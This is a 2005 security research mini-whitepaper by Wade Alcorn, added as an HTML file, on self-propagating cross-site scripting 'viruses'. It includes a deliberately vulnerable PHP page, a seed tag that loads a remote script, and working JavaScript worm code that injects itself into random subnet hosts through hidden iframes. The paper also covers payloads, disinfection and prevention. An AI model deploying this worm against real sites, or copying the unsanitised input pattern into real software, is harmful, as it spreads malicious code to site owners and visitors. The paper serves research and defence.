@@ -1,0 +1,259 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html><head>
+	<meta http-equiv="CONTENT-TYPE" content="text/html; charset=iso-8859-1"><title>The Cross-Site Scripting Virus</title>
+	
+	<meta name="KEYWORDS" content="XSS cross-site scripting virus">
+	<style>
+	<!--
+		@page { size: 8.5in 11in; margin: 0.79in }
+		P { margin-bottom: 0in; page-break-before: auto; page-break-after: auto }
+		P.western { font-family: "Arial", sans-serif; font-size: 10pt }
+		H1 { margin-bottom: 0.08in }
+		H1.western { font-family: "Bitstream Vera Sans", sans-serif; font-size: 16pt }
+		H1.cjk { font-family: "Andale Sans UI"; font-size: 16pt }
+		H1.ctl { font-family: "Lucidasans"; font-size: 16pt }
+		H2 { margin-bottom: 0.08in }
+		H2.western { font-family: "Bitstream Vera Sans", sans-serif; font-size: 14pt; font-style: italic }
+		H2.cjk { font-family: "Andale Sans UI"; font-size: 14pt; font-style: italic }
+		H2.ctl { font-family: "Lucidasans"; font-size: 14pt; font-style: italic }
+		PRE { font-family: "Bitstream Vera Sans Mono", monospace }
+		PRE.code-western { margin-left: 0.49in; font-family: "Courier New"; font-size: 9pt }
+		PRE.code-cjk { margin-left: 0.49in; font-family: "Bitstream Vera Sans Mono", monospace }
+		PRE.code-ctl { margin-left: 0.49in; font-family: "Bitstream Vera Sans Mono", monospace }
+	-->
+	</style></head>
+
+<body dir="ltr" lang="en-US">
+<h1 class="western">The Cross-site Scripting Virus</h1>
+<p class="western" style="margin-bottom: 0.2in;">Wade
+Alcorn<br><a href="mailto:wade@bindshell.net">wade@bindshell.net
+<br></a><a href="http://www.bindshell.net/">http://www.bindshell.net
+<br></a>Mini-Whitepaper <br><br>
+Published: 27<sup>th</sup> September 2005 <br>
+Last Edited: 16<sup>th</sup> October 2005 <br>
+Version: 1.0.11<br><br>
+Copyright (c) 2005 Wade Alcorn 
+<br>All Rights Reserved Worldwide</p>
+<h2 class="western">Abstract</h2>
+<p class="western" style="margin-bottom: 0.2in;">This paper explores
+the new threat of cross-site scripting (XSS) viruses. These
+viruses are a new species which are platform independent and not
+affected by common firewall configurations. XSS viruses could have a
+significant impact for Internet continuity, including distributed
+denial of service (DDOS) attacks, spam and dissemination of browser
+exploits. This is particularly relevant with the increasing
+sophistication of web browsers and the growing popularity of web
+based applications such as Wikis and Blogs.</p>
+<h2 class="western">Introduction</h2>
+<p class="western" style="margin-bottom: 0.2in;">As an inevitable
+consequence of expanded web application functionality, security
+implications on various levels have increased. The appearance of XSS
+is one such security issue. This vulnerability allows code to be
+injected into web sites with the aim of being parsed and/or executed
+by web browsers. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">Broadly, cross-site
+scripting can be divided into two areas: permanent and non-permanent.
+Non-permanent XSS is returned immediately and doesn't remain on the
+server. Alternatively, permanent XSS will remain on the server and be
+returned to any browser requesting the injected page. This paper is
+particularly concerned with the permanent variety of XSS.</p>
+<p class="western" style="margin-bottom: 0.2in;">It is possible to
+inject self propagating XSS code into a web application and it will
+spread via client web browsers. This creates a symbiotic relationship
+between browser and application server. The code will reside on
+vulnerable web applications and be executed within the client web
+browser. This relationship is not necessarily one-to-one.</p>
+<h2 class="western">Proof of Concept</h2>
+<p class="western" style="margin-bottom: 0.2in;">The following proof
+of concept demonstrates a XSS virus. The vulnerable environment
+created is an example scenario required for XSS viruses and does not
+show an exhaustive set of possible conditions. It illustrates
+permanent XSS within a web application. In this case, the
+vulnerability is exploitable via a get request, which allows a
+trivial virus to be created.</p>
+<p class="western" style="margin-bottom: 0.2in;">Initially an instance
+of the vulnerable web application will be seeded with the
+self-propagating code. When this code is executed by web browsers, it
+results in their infection. The infected web browsers connect to
+random sites and perform the exploiting get request. The injected
+code will, in turn, infect further vulnerable web applications with
+the self-propagating code.</p>
+<p class="western" style="margin-bottom: 0.2in;">The following crafted
+permanent XSS exploitable PHP page can be infected with a virus. The
+page accepts a parameter (param) value and writes it to a file
+(file.txt). This file is then returned in the request to the browser.
+The file will contain the previous value of the &#8220;param&#8221;
+parameter. If no parameter is passed it will display the file without
+updating it.</p>
+<p class="western" style="margin-bottom: 0.2in;">Web Application:
+index.php</p>
+<pre class="code-western"><tt>&lt;?php</tt>
+<tt>  $p=$HTTP_GET_VARS[&#8217;param&#8217;];</tt>
+<tt>  $filename = &#8220;./file.txt&#8221;;</tt>
+
+<tt>  if ($p != &#8220;&#8221;) {</tt>
+<tt>    $handle=fopen($filename, &#8220;wb&#8221;);</tt>
+<tt>    fputs($handle, $p);</tt>
+<tt>    fclose($handle);</tt>
+<tt>  }</tt>
+
+<tt>  $handle = fopen($filename, &#8220;r&#8221;);</tt>
+<tt>  $contents = fread($handle, filesize($filename));</tt>
+<tt>  fclose($handle);</tt>
+
+<tt>  print $contents;</tt>
+<tt>?&gt; </tt></pre><p class="western" style="margin-bottom: 0.2in;">
+This page (index.php) was hosted on multiple virtual servers within a
+10.0.0.0/24 subnet. One web application instance was then seeded with
+the following code which retrieves a javascript file and executes it.
+Alternatively, it is possible to inject the entire code into the
+vulnerable applications rather than requesting a javascript file. For
+simplicity, a javascript file (xssv.jsp) was requested.</p>
+<p class="western" style="margin-bottom: 0.2in;">Injected Seed Code:</p>
+<pre class="code-western" style="margin-bottom: 0.2in;"><code>&lt;iframe name=&#8221;iframex&#8221; id=&#8221;iframex&#8221; src=&#8221;hidden&#8221; style=&#8221;display:none&#8221;&gt;&lt;/iframe&gt; &lt;script SRC=&#8221;http://&lt;webserver&gt;/xssv.js&#8221;&gt;&lt;/script&gt;</code></pre><p class="western" style="margin-bottom: 0.2in;">
+The javascript file that was requested in the example is shown below.
+Its self-propagation uses an iframe which is periodically reloaded
+using the loadIframe() function. The target site IP address of the
+iframe is selected randomly within the 10.0.0.0/24 subnet via the
+function get_random_ip(). The XSS virus uses a combination of these
+two functions and the continual periodic invocation using the
+setInterval() function.</p>
+<p class="western" style="margin-bottom: 0.2in;">Javascipt: xssv.jsp</p>
+<pre class="code-western"><tt>function loadIframe(iframeName, url) {</tt>
+<tt>  if ( window.frames[iframeName] ) {</tt>
+<tt>    window.frames[iframeName].location = url;   </tt>
+<tt>    return false;</tt>
+<tt>  }</tt>
+<tt>  else return true;</tt>
+<tt>}</tt>
+
+<tt>function do_request() {</tt>
+<tt>  var ip = get_random_ip();</tt>
+<tt>  var exploit_string = '&lt;iframe name="iframe2" id="iframe2" src="hidden" style="display:none"&gt;&lt;/iframe&gt; &lt;script SRC="http://&lt;webserver&gt;/xssv.js"&gt;&lt;/script&gt;';</tt>
+
+<tt>  loadIframe('iframe2', "http://" + ip + "/index.php?param=" + exploit_string);</tt>
+<tt>}</tt>
+
+<tt>function get_random()</tt>
+<tt>{</tt>
+<tt>  var ranNum= Math.round(Math.random()*255);</tt>
+<tt>  return ranNum;</tt>
+<tt>}</tt>
+
+<tt>function get_random_ip()</tt>
+<tt>{</tt>
+<tt>  return "10.0.0."+get_random();</tt>
+<tt>}</tt>
+
+<tt>setInterval("do_request()", 10000); </tt></pre><p class="western" style="margin-bottom: 0.2in;">
+Viewing the seeded web application caused the browser to infect other
+web applications within the 10.0.0.0/24 subnet. This infection
+continued until some, but not all, applications were infected. At
+this point the browser was manually stopped. Another browser was then
+used to view one of the newly infected web applications. The virus
+then continued to infect the remaining uninfected web applications
+within the subnet. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">This proof of concept
+shows that under controlled conditions, not dissimilar to a real
+world environment, a XSS virus can be self-propagating and
+infectious.</p>
+<h2 class="western">Conventional Virus Differences</h2>
+<p class="western" style="margin-bottom: 0.2in;">Conventional viruses
+reside and execute on the same system. XSS viruses separate these two
+requirements in a symbiotic relationship between the server and the
+browser. The execution occurs on the client browser and the code
+resides on the server.</p>
+<p class="western" style="margin-bottom: 0.2in;">Platform
+indiscrimination also differentiates a XSS virus from its
+conventional counterparts. This is due to the encapsulation within
+HTML and the HTTP/HTTPS protocol. These standards are supported on
+most web browsers running on a <span style="background: transparent none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;">variety</span>
+of operating systems, making cross-site scripting viruses platform
+independent. This platform independence increases the number of
+potential web applications that can be infected. 
+</p>
+<h2 class="western">Infection</h2>
+<p class="western" style="margin-bottom: 0.2in;">Cross-site scripting
+virus infection occurs in two stages and usually on at least two
+devices. As such, there are two kinds of infections that work
+symbiotically. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">The server is
+infected with persistent <span style="background: transparent none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;">self-propagating</span>
+code that it doesn't execute. The second stage is browser infection.
+The injected code is loaded from the site into the non-persistent web
+browser and executed. The execution then seeks new servers to be
+exploited and potentially executes its payload. Typically, there will
+be one infected server to many infected browsers.</p>
+<h2 class="western">Payload</h2>
+<p class="western" style="margin-bottom: 0.2in;">Like conventional
+viruses, XSS viruses are capable of delivering payloads. The payloads
+will be executed in the browser and have the restriction of HTML
+compliant code. That is, the payload can perform HTML functions,
+including javascript. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">Whilst this does pose
+limitations, XSS viruses are still capable of malicious activity. For
+example, the payload could deliver a DDOS attack, display spam or
+contain browser exploits. Future payload capability is likely to be
+greater due to increasing browser sophistication.</p>
+<h2 class="western">Disinfection</h2>
+<p class="western" style="margin-bottom: 0.2in;">The
+relationship between the server and one browser can be broken by
+simply shutting down the browser. However, there is currently no
+means to prevent browser re-infection other than disabling browser
+functionality. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">Potential
+disinfection methods will involve the referrer field from the request
+header. This is due to the fact that the referrer is likely to be
+logged on web servers where infection has been attempted. Thus, where
+referrer spoofing hasn't occurred, following the log files will
+reveal a trail back to the source of the virus.</p>
+<h2 class="western">Prevention</h2>
+<p class="western" style="margin-bottom: 0.2in;">A common initial
+preventative to viral infection is a network level firewall. As
+HTTP/HTTPS protocols are afforded unvetted access through common
+firewall configurations, these firewall barriers are ineffectual. A
+potential remedy to this is an application firewall with the
+appropriate XSS virus signatures. Whilst unlikely, the
+most obvious way to prevent XSS viruses is to remove XSS
+vulnerabilities from web applications.  </p>
+<h2 class="western">Conclusion</h2>
+<p class="western" style="margin-bottom: 0.2in;">The infectious nature
+of XSS viruses has been demonstrated within a controlled environment.
+It was achieved through a purposely crafted vulnerable web
+application distributed across a subnet. This environment was
+subsequently infected.</p>
+<p class="western" style="margin-bottom: 0.2in;">XSS viruses are a new
+species. They distinguish themselves from their conventional cousins
+through the requirement for a server-client symbiotic relationship
+and their platform independence. These differences have both positive
+and negative influences on the virulence of infection. 
+</p>
+<p class="western" style="margin-bottom: 0.2in;">This paper
+illustrates that XSS viruses are platform independent and capable of
+carrying out malicious functions. Whilst there are mitigating
+factors, these points coupled with the increasing sophistication of
+web browsers show the threat of XSS viruses. Proactive measures need
+to be taken in order to combat this threat, before XSS viruses become
+endemic. 
+</p>
+<h2 class="western">References</h2>
+<p class="western" style="margin-bottom: 0.2in; page-break-before: auto; page-break-after: auto;">
+[1] Remote Scripting with IFRAMEs
+<br><a href="http://developer.apple.com/internet/webcontent/iframe.html">http://developer.apple.com/internet/webcontent/iframe.html</a><br>[2]
+HTML Code Injection and Cross-site scripting
+<br><a href="http://www.technicalinfo.net/papers/CSS.html">http://www.technicalinfo.net/papers/CSS.html</a><br>[3]
+JavaScript: Random Scripts
+<br><a href="http://www.pageresource.com/jscript/jrandom.htm">http://www.pageresource.com/jscript/jrandom.htm</a><br>[4]
+Mozilla Foundation Security Advisory 2005-58
+<br><a href="http://www.mozilla.org/security/announce/mfsa2005-58.html#xmlhttp">http://www.mozilla.org/security/announce/mfsa2005-58.html#xmlhttp</a><br>[5]
+PHP Manual <br><a href="http://www.php.net/">http://www.php.net</a><br>[6]
+Scripting Iframes - Tutorial and Examples
+<br><a href="http://www.dyn-web.com/dhtml/iframes/">http://www.dyn-web.com/dhtml/iframes/</a><br>[7]
+CGISecurity's Cross Site Scripting FAQ
+<br><a href="http://www.cgisecurity.com/articles/xss-faq.shtml">http://www.cgisecurity.com/articles/xss-faq.shtml</a></p>
+</body></html>
